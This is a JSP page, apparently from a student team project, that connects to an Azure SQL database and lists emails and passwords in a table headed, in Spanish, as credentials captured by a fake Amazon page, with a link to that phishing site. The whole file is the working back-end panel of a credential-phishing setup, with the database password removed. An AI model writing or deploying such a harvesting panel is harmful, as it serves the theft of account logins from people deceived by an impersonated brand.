<%-- 
    Document   : watchBD
    Created on : Feb 19, 2019, 12:26:14 AM
    Author     : mtz_p
--%>
<%@ page import="java.sql.ResultSet" %>
<%@ page import="java.sql.Statement" %>
<%@ page import="java.sql.Connection" %>
<%@ page import="java.sql.DriverManager" %>

<%@page contentType="text/html" pageEncoding="UTF-8"%>

<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>JSP Page</title>
    </head>
    <body>
        <form method="post">
            <h2>Credenciales capturadas por pagina de amazon fake </h2>
            <a href="http://sbd-project1-team4-v2.us-east-2.elasticbeanstalk.com/">Visitar pagina para probar funcionamiento</a><hr>
            
<table border="2">
<tr>
<td>Correo</td>
<td>Contrasena</td>
</tr>
<% try {
 Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
 //se quito la contraseña por motivos de seguridad
String url = "jdbc:sqlserver://team4-sbd.database.windows.net:1433;database=pruebasBD;user=usuarioPruebas@team4-sbd;password={some_password};encrypt=true;trustServerCertificate=false;hostNameInCertificate=*.database.windows.net;loginTimeout=30;";

Connection conn=DriverManager.getConnection(url);
Statement stmt=conn.createStatement();
ResultSet rs=stmt.executeQuery("select * from Credenciales");
while(rs.next())
{ %>
<tr>
    <td><%=rs.getString(1) %></td>
<td><%=rs.getString(2) %></td></tr>


 <%

}
%>
</table>
<%
        rs.close();
        stmt.close();
        conn.close();
   }
   catch(Exception e)
   {
        e.printStackTrace();
   }
   %>
</form>
    </body>
</html>
